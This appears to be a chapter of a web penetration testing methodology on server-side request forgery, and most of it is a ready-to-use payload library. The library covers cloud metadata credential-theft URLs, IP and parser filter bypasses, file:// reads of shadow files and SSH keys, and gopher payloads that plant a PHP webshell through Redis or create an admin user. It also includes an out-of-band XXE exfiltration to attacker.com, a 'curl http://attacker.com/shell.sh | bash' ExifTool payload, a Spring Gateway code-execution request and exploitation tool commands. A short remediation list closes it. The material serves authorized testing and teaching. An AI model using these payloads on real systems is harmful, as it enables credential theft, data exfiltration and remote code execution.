---
title: "Server-Side Request Forgery (SSRF)"
date: 2026-02-24
draft: false
---

# Server-Side Request Forgery (SSRF)

> **Severity**: Critical
> **CWE**: CWE-918
> **OWASP**: A10:2021 – Server-Side Request Forgery
> **PortSwigger Rank**: Top-tier, dedicated learning path

---

## What Is SSRF?

Server-Side Request Forgery (SSRF) occurs when an attacker can make the **server issue HTTP (or other protocol) requests to an arbitrary destination** — whether internal services, cloud metadata endpoints, or external infrastructure — on the attacker's behalf.

The danger lies in what the server *already has access to*: internal APIs, admin interfaces, cloud IAM credentials, databases, microservices behind firewalls. The server trusts itself; SSRF abuses that trust.

### Why It Matters in 2025

- Cloud-native architectures make SSRF a **path to IAM credential theft** (AWS, GCP, Azure metadata endpoints)
- Microservice environments expose a **flat internal network** — SSRF is the pivot
- Web hooks, PDF generators, image processors, XML parsers, and OAuth flows **all create SSRF surface**
- Chained with open redirects, request smuggling, or deserialization → **full RCE without authentication**

---

## Attack Surface Map — Where to Look

### Parameter Names (Hunt These First)

```
url, uri, src, dest, redirect, redirect_uri, return, returnUrl, next,
path, page, file, document, resource, ref, reference, link, load,
fetch, pull, host, site, domain, api, endpoint, target, to, out,
window, feed, data, proxy, forward, navigate, open, view, show,
navigate, preview, thumb, thumbnail, pdf, image, img, logo, icon,
webhook, callback, notify, ping, import, export, template, report
```

### Feature Areas That Almost Always Have SSRF Surface

| Feature | SSRF Vector |
|---------|-------------|
| URL preview / link unfurling | Server fetches arbitrary URL to generate preview |
| PDF / screenshot generation | wkhtmltopdf, headless Chrome fetching HTML with `<iframe>`, `<img>` |
| Image processing / resize | ImageMagick, FFmpeg reading from URL |
| XML / SOAP APIs | XXE → SSRF via `SYSTEM` entities |
| OAuth / SAML / OIDC | `request_uri`, `redirect_uri`, `AssertionConsumerServiceURL` |
| Webhooks | App fetches user-supplied URL to validate or deliver payload |
| File import (CSV, XML, JSON) | External references, `@import`, DTD entities |
| Integrations (Slack, Zapier) | `target_url`, `icon_url`, `avatar_url` parameters |
| Internal API proxies | `/proxy?url=`, `/fetch?resource=` |
| Cloud functions / Serverless | Environment metadata, function invocation endpoints |
| Kubernetes / Docker | Internal cluster API, container metadata |

---

## Discovery Checklist

### Phase 1 — Passive Reconnaissance

- [ ] Intercept all requests — look for parameters containing URLs, IP addresses, hostnames, or file paths
- [ ] Check JavaScript source files for fetch/axios/XHR calls using user-controlled parameters
- [ ] Review API documentation (Swagger/OpenAPI) for endpoints accepting `url`, `src`, `redirect` parameters
- [ ] Identify file upload features — check if the app processes uploaded file content server-side
- [ ] Check for webhook configuration pages, integration settings, or URL validation features
- [ ] Look for PDF/report generation or thumbnail/preview features
- [ ] Check `robots.txt`, `sitemap.xml`, JS bundles for undocumented endpoints
- [ ] Review HTTP history for `Referer`, `Origin`, `X-Forwarded-For` headers reflected in backend calls

### Phase 2 — Active Discovery

- [ ] Inject your Burp Collaborator / interactsh URL into **every** parameter that looks URL-related
- [ ] Test HTTP headers: `Referer`, `X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL`, `True-Client-IP`
- [ ] Test JSON body parameters: `{"url": "http://your.oast.domain/"}`
- [ ] Test XML body: `<url>http://your.oast.domain/</url>`
- [ ] Test multipart form data with URL-accepting fields
- [ ] Fuzz parameter names using a wordlist against every endpoint (ffuf)
- [ ] Check redirect chains — does the app follow 302/301/307 redirects?
- [ ] Test POST body of webhook/import endpoints
- [ ] Test SVG, XML, DOCX file uploads for external entity / URL reference processing

### Phase 3 — Confirm & Escalate

- [ ] Confirm DNS resolution via OOB (Collaborator/interactsh DNS hit)
- [ ] Confirm HTTP request via OOB HTTP hit
- [ ] Test `http://127.0.0.1/` — does response differ from unreachable host?
- [ ] Enumerate internal ports (response time / body differences)
- [ ] Test `http://169.254.169.254/` — cloud metadata (check which cloud)
- [ ] Try alternate IP encodings if direct payload is blocked
- [ ] Test alternative protocols: `file://`, `dict://`, `gopher://`
- [ ] Check if redirect following allows bypass (302 → internal IP)
- [ ] Test Kubernetes API: `http://kubernetes.default.svc.cluster.local/`

---

## Payload Library

### Section 1 — Basic Sanity Check Payloads

```
# Out-of-band verification (replace with your OAST domain):
http://YOUR.burpcollaborator.net/
http://YOUR.oast.fun/
http://YOUR.interactsh.com/

# Localhost
http://127.0.0.1/
http://localhost/
http://0.0.0.0/
http://0/
http://[::1]/
```

### Section 2 — Internal Network Probing

```
# Common internal CIDRs:
http://10.0.0.1/
http://10.0.0.2/
http://172.16.0.1/
http://192.168.0.1/
http://192.168.1.1/

# Internal service discovery (common ports):
http://127.0.0.1:80/
http://127.0.0.1:443/
http://127.0.0.1:8080/
http://127.0.0.1:8443/
http://127.0.0.1:8888/
http://127.0.0.1:9000/
http://127.0.0.1:9200/      # Elasticsearch
http://127.0.0.1:5601/      # Kibana
http://127.0.0.1:6379/      # Redis
http://127.0.0.1:11211/     # Memcached
http://127.0.0.1:27017/     # MongoDB
http://127.0.0.1:3306/      # MySQL
http://127.0.0.1:5432/      # PostgreSQL
http://127.0.0.1:2375/      # Docker API (no TLS)
http://127.0.0.1:2379/      # etcd (Kubernetes)
http://127.0.0.1:10250/     # Kubelet API
http://127.0.0.1:4848/      # GlassFish admin
http://127.0.0.1:7001/      # WebLogic
http://127.0.0.1:4567/      # Spring Boot internal
http://127.0.0.1:8161/      # ActiveMQ
http://127.0.0.1:61616/     # ActiveMQ (messaging)
http://127.0.0.1:15672/     # RabbitMQ management
http://127.0.0.1:25/        # SMTP
http://127.0.0.1:22/        # SSH (banner grab)
```

### Section 3 — Cloud Metadata Endpoints

#### AWS EC2 (IMDSv1 — No Auth Required)
```
http://169.254.169.254/
http://169.254.169.254/latest/
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/placement/availability-zone
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document

# ECS Task credentials:
http://169.254.170.2/v2/credentials/
# (full path comes from $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI env var)

# Lambda runtime:
http://127.0.0.1:9001/2018-06-01/runtime/invocation/next

# AWS IPv6 metadata endpoint:
http://[fd00:ec2::254]/latest/meta-data/
```

#### GCP (Requires `Metadata-Flavor: Google` header)
```
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id
http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys
http://metadata.google.internal/computeMetadata/v1/instance/zone
http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json
```

#### Azure (Requires `Metadata: true` header)
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
http://169.254.169.254/metadata/instance/network?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://storage.azure.com/
http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01&format=text
http://169.254.169.254/metadata/instance/compute/resourceGroupName?api-version=2021-02-01&format=text
```

#### DigitalOcean
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/address
http://169.254.169.254/metadata/v1/user-data
```

#### Oracle Cloud Infrastructure
```
http://169.254.169.254/opc/v1/instance/
http://169.254.169.254/opc/v1/instance/id
http://169.254.169.254/opc/v1/instance/compartmentId
http://169.254.169.254/opc/v1/instance/region
http://169.254.169.254/opc/v1/instance/metadata/
http://169.254.169.254/opc/v2/instance/
```

#### Alibaba Cloud
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/ram/security-credentials/
http://100.100.100.200/latest/meta-data/ram/security-credentials/ROLE_NAME
http://100.100.100.200/latest/user-data
```

#### Kubernetes Internal
```
http://kubernetes.default/
http://kubernetes.default.svc.cluster.local/
http://10.96.0.1/api/v1/namespaces/default/secrets
http://10.96.0.1/api/v1/pods
http://10.96.0.1/api/v1/nodes
http://etcd.default.svc.cluster.local:2379/v2/keys/
http://10.0.0.1:10250/pods        # Kubelet API
http://10.0.0.1:10255/pods        # Kubelet read-only
```

---

### Section 4 — Filter Bypass Payloads

#### IP Obfuscation — 127.0.0.1

```
# Decimal (Dword):
http://2130706433/

# Octal:
http://0177.0.0.1/
http://00000177.0.0.01/

# Hexadecimal:
http://0x7f000001/
http://0x7f.0x0.0x0.0x1/

# IPv4-mapped IPv6:
http://[::ffff:127.0.0.1]/
http://[::ffff:7f00:0001]/

# IPv6 loopback:
http://[::1]/
http://[0:0:0:0:0:0:0:1]/

# 0 (resolves to 127.0.0.1 on Linux):
http://0/
http://0.0.0.0/

# 127.x.x.x loopback range (all work):
http://127.0.0.2/
http://127.1.1.1/
http://127.255.255.255/
```

#### IP Obfuscation — 169.254.169.254 (AWS)

```
# Decimal:
http://2852039166/

# Octal:
http://0251.0376.0251.0376/

# Hexadecimal:
http://0xa9fea9fe/
http://0xa9.0xfe.0xa9.0xfe/

# IPv4-mapped IPv6:
http://[::ffff:169.254.169.254]/
http://[::ffff:a9fe:a9fe]/

# IPv6 AWS endpoint:
http://[fd00:ec2::254]/latest/meta-data/
```

#### URL Parser Confusion (@ Character)

```
# If allowlist requires "trusted.com":
http://trusted.com@evil.com/
http://trusted.com%40evil.com/

# If allowlist requires prefix match:
http://trusted.com.evil.com/
http://evil.com/trusted.com/../etc/passwd

# Fragment tricks:
http://evil.com#trusted.com
http://trusted.com?x=1#@evil.com/

# Double @ (parser differential):
http://trusted.com@internal@evil.com/

# Backslash normalization (Windows):
http://trusted.com\@127.0.0.1/
http:\\127.0.0.1\path
```

#### URL Encoding Bypasses

```
# Single encode:
http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/

# Double encode:
http://%2531%2536%2539%25...

# Null byte injection:
http://trusted.com%00@internal.host/
http://trusted.com%00.evil.com/

# Newline injection:
http://trusted.com%0a@evil.com/
http://trusted.com%0d@evil.com/

# Tab:
http://trusted.com%09@evil.com/

# Unicode fullwidth digits:
http://①②⑦.⓪.⓪.①/

# Scheme case:
HTTP://127.0.0.1/
hTTps://127.0.0.1/
```

#### Wildcard DNS Services (No Setup Needed)

```
# These domains resolve to the embedded IP:
http://127.0.0.1.nip.io/
http://169.254.169.254.nip.io/
http://10.0.0.1.nip.io/
http://192.168.0.1.nip.io/

# xip.io (same trick):
http://127.0.0.1.xip.io/
http://169.254.169.254.xip.io/

# localtest.me (resolves to 127.0.0.1):
http://localtest.me/
http://www.localtest.me/

# Subdomain variants (still resolve):
http://app.127.0.0.1.nip.io/
http://admin.169.254.169.254.nip.io/
```

#### Open Redirect Chain Bypass

```
# If only HTTPS trusted.com is allowed:
https://trusted.com/redirect?url=http://169.254.169.254/latest/meta-data/
https://trusted.com/redirect?next=http://127.0.0.1/admin
https://trusted.com/redirect?return=http://internal-service/

# Common open redirect parameters:
?url=  ?redirect=  ?next=  ?return=  ?returnUrl=  ?goto=
?dest=  ?destination=  ?redir=  ?redirect_uri=  ?location=

# 307 Redirect (preserves POST method — critical for POST SSRF):
# Host your 307 redirector:
Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/
Status: 307 Temporary Redirect
```

---

### Section 5 — Protocol-Based Payloads

#### file:// — Local File Read

```
file:///etc/passwd
file:///etc/shadow
file:///etc/hosts
file:///etc/nginx/nginx.conf
file:///etc/apache2/apache2.conf
file:///proc/self/environ
file:///proc/self/cmdline
file:///proc/self/maps
file:///proc/net/tcp
file:///proc/net/fib_trie
file:///var/log/apache2/access.log
file:///var/log/nginx/access.log
file:///home/user/.ssh/id_rsa
file:///root/.ssh/id_rsa
file:///root/.ssh/authorized_keys
file:///app/config.py
file:///var/www/html/.env
file:///var/www/html/config.php

# Windows:
file:///C:/Windows/win.ini
file:///C:/inetpub/wwwroot/web.config
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:/Users/Administrator/.ssh/id_rsa

# UNC (NTLM auth trigger on Windows):
file://ATTACKER_IP/share
\\ATTACKER_IP\share
```

#### dict:// — Banner Grabbing & Memcached/Redis

```
# Redis info:
dict://127.0.0.1:6379/info

# Memcached stats:
dict://127.0.0.1:11211/stats
dict://127.0.0.1:11211/get:KEY_NAME

# SMTP banner:
dict://127.0.0.1:25/

# SSH banner:
dict://127.0.0.1:22/
```

#### gopher:// — Arbitrary TCP

```
# Format: gopher://host:port/_{URL-encoded raw TCP data}
# \r\n MUST be encoded as %0D%0A

# Redis — set key:
gopher://127.0.0.1:6379/_%2A3%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Afoo%0D%0A%243%0D%0Abar%0D%0A

# Redis — webshell (flushall + config set):
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A%2Fvar%2Fwww%2Fhtml%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A

# Memcached — read key:
gopher://127.0.0.1:11211/_%67et%20secretkey%0d%0a

# SMTP — send email:
gopher://127.0.0.1:25/_HELO%20attacker.com%0d%0aMAIL%20FROM%3A%3Cattacker%40evil.com%3E%0d%0aRCPT%20TO%3A%3Cvictim%40company.com%3E%0d%0aDATA%0d%0aSubject%3A%20Test%0d%0a%0d%0aBody%0d%0a.%0d%0aQUIT%0d%0a

# HTTP GET to internal API:
gopher://127.0.0.1:8080/_%47ET%20%2Fapi%2Fadmin%2Fusers%20HTTP%2F1.1%0d%0aHost%3A%20127.0.0.1%0d%0a%0d%0a

# HTTP POST to internal API:
gopher://127.0.0.1:8080/_%50OST%20%2Fapi%2Fadmin%2FcreateAdmin%20HTTP%2F1.1%0d%0aHost%3A%20127.0.0.1%0d%0aContent-Type%3A%20application%2Fjson%0d%0aContent-Length%3A%2037%0d%0a%0d%0a%7B%22username%22%3A%22hacker%22%2C%22admin%22%3Atrue%7D
```

> **Tip**: Use [Gopherus](https://github.com/tarunkant/Gopherus) to auto-generate gopher payloads for Redis, MySQL, FastCGI, SMTP, Memcached, MongoDB, Zabbix.

```bash
python gopherus.py --exploit redis       # webshell or cron
python gopherus.py --exploit fastcgi     # PHP-FPM → RCE
python gopherus.py --exploit smtp        # internal mail relay
python gopherus.py --exploit memcache    # key injection
python gopherus.py --exploit mysql       # unauthenticated MySQL
```

#### FastCGI via Gopher (PHP-FPM → RCE)

```
# PHP-FPM listens on 9000 by default — this SSRF chain is critical
# Gopherus generates payload automatically, but key parameters:
# SCRIPT_FILENAME = path to existing .php file
# PHP_VALUE = auto_prepend_file = php://input
# REQUEST_METHOD = POST
# POST body = <?php system('id');?>

# Generated gopher payload (example structure):
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00...
```

---

### Section 6 — Blind SSRF Detection

```
# Burp Collaborator (Burp Pro):
http://UNIQUE.burpcollaborator.net/
https://UNIQUE.burpcollaborator.net/
http://UNIQUE.oastify.com/

# interactsh (free, open-source):
# Install: go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
# Run:     interactsh-client -v
# Payload: http://UNIQUE.oast.fun/

# webhook.site (quick manual test):
https://webhook.site/YOUR-UUID

# Canarytokens.org (DNS + HTTP):
http://UNIQUE.canarytokens.com/

# Self-hosted listener:
python3 -m http.server 80
nc -lvnp 80
```

**What to look for:**
- DNS hit only → server resolves DNS but firewall blocks HTTP (blind SSRF confirmed)
- HTTP hit → full SSRF, response may not be returned to you
- No hit but timing difference → filtered but connection attempted (still SSRF)
- Error message reveals internal host → partial SSRF

---

### Section 7 — SSRF via Application Features

#### wkhtmltopdf / PDF Generators

```html
<!-- HTML submitted to PDF renderer: -->
<iframe src="file:///etc/passwd"></iframe>
<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>

<!-- JavaScript execution (if enabled): -->
<script>
  var x = new XMLHttpRequest();
  x.onload = function() { document.write(btoa(this.responseText)); };
  x.open('GET', 'file:///etc/passwd');
  x.send();
</script>

<!-- Meta redirect: -->
<meta http-equiv="refresh" content="0;url=http://169.254.169.254/latest/meta-data/">

<!-- Img tag OOB: -->
<img src="http://169.254.169.254/latest/meta-data/">
```

#### ImageMagick

```
# MVG file (Magick Vector Graphics) — SSRF:
push graphic-context
viewbox 0 0 640 480
fill 'url(http://169.254.169.254/latest/meta-data/)'
pop graphic-context

# Upload as .mvg or rename to bypass extension filter:
# Also works: .svg containing <image xlink:href="..."/>
```

#### FFmpeg (Video Processing SSRF)

```
# Malicious HLS playlist — name it evil.m3u8:
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# FFmpeg concat SSRF:
ffconcat version 1.0
file 'http://169.254.169.254/latest/meta-data/'
```

#### SVG Upload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <text>&xxe;</text>
  <image xlink:href="http://169.254.169.254/latest/meta-data/" x="0" y="0" height="100" width="100"/>
</svg>
```

#### XML / SOAP / XXE → SSRF

```xml
<!-- Classic external entity SSRF: -->
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<root><data>&xxe;</data></root>

<!-- Blind OOB XXE (DTD on attacker server): -->
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe; ]>
<foo>test</foo>

<!-- evil.dtd content: -->
<!-- <!ENTITY % data SYSTEM "file:///etc/passwd">
     <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?d=%data;'>">
     %param1; %exfil; -->
```

#### Webhook Validation Bypass

```
# App fetches URL to validate it's reachable, then stores it:
POST /api/webhooks HTTP/1.1
Content-Type: application/json

{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

# Redirect trick:
# 1. Register: {"url": "https://attacker.com/redirect"}
# 2. Serve 302: Location: http://169.254.169.254/latest/meta-data/
# 3. App follows redirect → fetches metadata
```

---

### Section 8 — DNS Rebinding Attack

Used when the application validates the IP **before** making the request, and the resolved IP is cached for only one lookup.

**Attack Flow:**
```
1. Register a domain (attacker.com) with TTL = 0
2. DNS: first query returns 1.2.3.4 (allowed/public IP) → validation passes
3. App makes actual HTTP request → triggers new DNS lookup
4. DNS: second query returns 169.254.169.254 → app fetches cloud metadata
5. Response returned to attacker
```

**Tools:**
```bash
# Singularity — full DNS rebinding framework:
git clone https://github.com/nccgroup/singularity
# Configure: attacker.com → rebind between allowed_ip and 169.254.169.254

# rbndr.us (quick free service):
# Format: ALLOWED-IP-as-dashes.TARGET-IP-as-dashes.rbndr.us
http://1-2-3-4.169-254-169-254.rbndr.us/

# whonow (simple DNS rebinding server):
pip install whonow
whonow -r "1.2.3.4/169.254.169.254" -t 1 attacker.com
```

---

### Section 9 — SSRF via HTTP Headers

```
# Host header SSRF (if app uses Host to build backend requests):
GET /api/fetch HTTP/1.1
Host: 169.254.169.254

# X-Forwarded-Host:
X-Forwarded-Host: metadata.google.internal
X-Forwarded-Host: 169.254.169.254

# X-Original-URL / X-Rewrite-URL (nginx/Apache overrides):
X-Original-URL: /latest/meta-data/
X-Rewrite-URL: /latest/meta-data/

# Forwarded:
Forwarded: for=127.0.0.1;host=169.254.169.254

# True-Client-IP / CF-Connecting-IP:
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
```

---

### Section 10 — Real-World CVE Chains

#### CVE-2021-26855 — Microsoft Exchange ProxyLogon (SSRF → RCE)

```
# Pre-auth SSRF in Exchange Web Services — server acts as SYSTEM
# Step 1: SSRF bypasses auth by accessing backend as SYSTEM
GET /ecp/y.js HTTP/1.1
Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3;
        X-BEResource=localhost/owa/auth/logon.aspx?~3;

# Step 2: Chain with CVE-2021-27065 (arbitrary file write) → webshell
# Step 3: RCE as SYSTEM
# Impact: 250,000+ Exchange servers compromised in 2021
```

#### CVE-2021-21972 — VMware vCenter SSRF → RCE

```
# Unauthenticated SSRF in vSphere Client plugin endpoint
POST /ui/vropspluginui/rest/services/uploadova HTTP/1.1
Host: vcenter.target.com

# Upload .tar containing JSP webshell via SSRF
# No authentication required
# CVSSv3: 9.8 Critical
```

#### CVE-2022-22947 — Spring Cloud Gateway RCE

```
# Unauthenticated code injection via Spring Actuator + SSRF
# Requires actuator endpoint to be exposed (common misconfiguration)

# Step 1: Create malicious route with SpEL injection:
POST /actuator/gateway/routes/hackroute HTTP/1.1
Content-Type: application/json

{
  "id": "hackroute",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()).next()}"
    }
  }],
  "uri": "http://example.com"
}

# Step 2: Refresh routes:
POST /actuator/gateway/refresh HTTP/1.1

# Step 3: Trigger route → SpEL executes → RCE
GET /hackroute HTTP/1.1
```

#### CVE-2024-21893 — Ivanti Connect Secure SSRF

```
# Pre-auth SSRF in SAML component
# Exploited by UNC5221 (nation-state) in 2024
# Chained with CVE-2024-21887 (command injection) for RCE as root

# Pattern: malformed SAML request triggers server-side fetch
# to attacker-controlled URL → pivot to internal admin API
# CVSSv3: 8.2 High
```

#### GitLab ExifTool RCE — CVE-2021-22205

```
# Unauthenticated RCE via image upload → ExifTool processing
# ExifTool CVE-2021-22204: DjVu file triggers command injection
# GitLab processes all image uploads through ExifTool

# Malicious DjVu file triggers:
(metadata "\c${system('curl http://attacker.com/shell.sh | bash')};")

# CVSSv3: 10.0 — unauthenticated RCE in GitLab < 13.10.3
```

---

## Tool Arsenal

```bash
# SSRFmap — automated exploitation:
git clone https://github.com/swisskyrepo/SSRFmap
python ssrfmap.py -r burp_request.txt -p url --module readfiles
python ssrfmap.py -r burp_request.txt -p url --module portscan
python ssrfmap.py -r burp_request.txt -p url --module redis
python ssrfmap.py -r burp_request.txt -p url --module aws
python ssrfmap.py -r burp_request.txt -p url --module networkscan

# Gopherus — gopher payload generator:
git clone https://github.com/tarunkant/Gopherus
python gopherus.py --exploit redis
python gopherus.py --exploit fastcgi
python gopherus.py --exploit smtp
python gopherus.py --exploit memcache

# interactsh — OAST server:
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
interactsh-client -v

# ffuf — parameter fuzzing:
ffuf -w ~/wordlists/ssrf-params.txt:PARAM \
     -w ~/wordlists/ssrf-payloads.txt:PAYLOAD \
     -u "https://target.com/PARAM=PAYLOAD" \
     -fs 0 -mc all

# nuclei — template-based SSRF:
nuclei -t ~/nuclei-templates/vulnerabilities/generic/ssrf.yaml \
       -t ~/nuclei-templates/vulnerabilities/aws/ \
       -u https://target.com

# Burp Extensions:
# - Collaborator Everywhere (auto-inject OAST payload in all params)
# - SSRF Scanner (active scanner)
# - Backslash Powered Scanner

# Manual IP conversion (Python one-liner):
python3 -c "import struct,socket; print(struct.unpack('!I', socket.inet_aton('169.254.169.254'))[0])"
# → 2852039166
```

---

## Remediation Reference

> For report writing — what the dev needs to fix:

- **Allowlist-only approach**: Validate against an explicit allowlist of allowed domains/IPs, not a denylist
- **Disable unnecessary URL schemes**: Only allow `https://` — block `file://`, `gopher://`, `dict://`, `ftp://`
- **Resolve and validate**: After DNS resolution, verify the resolved IP is not in RFC1918 / loopback / link-local ranges
- **Enforce IMDSv2**: On AWS, enforce Instance Metadata Service v2 (token-required) and disable IMDSv1
- **Network segmentation**: Servers making outbound requests should not have access to the metadata network
- **Disable URL-following in HTTP libraries**: Set `follow_redirects=False` or validate redirect destinations
- **Block internal ranges**: 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16, ::1, fd00::/8

---

## Quick Reference Card

| Goal | Payload |
|------|---------|
| Confirm SSRF | `http://YOUR.oast.fun/` |
| Localhost | `http://127.0.0.1/` or `http://0/` |
| AWS metadata | `http://169.254.169.254/latest/meta-data/` |
| AWS IAM creds | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` |
| GCP token | `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` |
| Azure token | `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/` |
| Alibaba | `http://100.100.100.200/latest/meta-data/ram/security-credentials/` |
| Bypass 127.0.0.1 filter | `http://2130706433/` or `http://0177.0.0.1/` |
| Bypass 169.254.x filter | `http://2852039166/` or `http://0xa9fea9fe/` |
| Local file read | `file:///etc/passwd` |
| Redis RCE | `gopher://127.0.0.1:6379/_...` (Gopherus) |
| PHP-FPM RCE | `gopher://127.0.0.1:9000/_...` (Gopherus) |
| Port scan | `http://127.0.0.1:PORT/` (time-based) |
| DNS rebinding | `http://ALLOWED.TARGET.rbndr.us/` |
| Open redirect chain | `https://trusted.com/redirect?url=http://169.254.169.254/` |

---

*Part of the Web Application Penetration Testing Methodology series.*
*Previous: — | Next: [Chapter 17 — Path Traversal](17_PathTraversal.md)*
